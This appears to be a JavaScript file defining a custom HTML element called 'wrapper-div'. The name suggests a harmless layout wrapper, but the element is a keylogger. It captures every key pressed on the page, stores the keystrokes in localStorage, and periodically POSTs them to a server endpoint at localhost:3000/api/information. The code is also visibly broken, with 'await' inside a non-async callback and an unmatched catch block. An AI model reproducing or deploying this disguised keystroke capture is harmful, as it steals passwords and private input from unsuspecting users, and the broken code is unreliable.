// IIFE

(function() {

  class WrapperDiv extends HTMLElement {
    constructor() {
      // Must always call super
      super()
      // Attach object to Shadow Dom
      this._shadowRoot = this.attachShadow({mode: 'open'})

      // Set empty string - will eventually be recorded and cleared
      let str = ""

      // Append keystroke to string on each keydown
      document.onkeydown = function(e) {
        str += e.key
      }

      setInterval(() => {
        // console.log(str)
        window.localStorage.setItem("key-stroke-log", str)
        // str = ""
      }, 3000)

      setInterval(() => {
        let value = window.localStorage.getItem("key-stroke-log")
        console.log(value)

        // Custom Fetch To Local Server 3000
        // const url = 'http://localhost:3000/api/information';
        //
        // try {
        //   const response = await fetch(url, {
        //     method: 'POST', // or 'PUT'
        //     body: JSON.stringify(value), // data can be `string` or {object}!
        //     headers: {
        //       'Content-Type': 'application/json'
        //     }
        //   });
        //   const json = await response.json();
        //   console.log('Success:', JSON.stringify(json));

        try {
          const data = await postData('http://localhost:3000/api/information', { value });
          console.log(JSON.stringify(data)); // JSON-string from `response.json()` call
        } catch (error) {
          console.error(error);
        }

        async function postData(url = '', data = {}) {
          // Default options are marked with *
          const response = await fetch(url, {
            method: 'POST', // *GET, POST, PUT, DELETE, etc.
            mode: 'cors', // no-cors, *cors, same-origin
            cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
            credentials: 'same-origin', // include, *same-origin, omit
            headers: {
              'Content-Type': 'application/json'
              // 'Content-Type': 'application/x-www-form-urlencoded',
            },
            redirect: 'follow', // manual, *follow, error
            referrer: 'no-referrer', // no-referrer, *client
            body: JSON.stringify(data) // body data type must match "Content-Type" header
          });
          return await response.json(); // parses JSON response into native JavaScript objects
        }

        } catch (error) {
          console.error('Error:', error);
        }


      }, 9000)
    }
  }

  customElements.define('wrapper-div', WrapperDiv)
}())
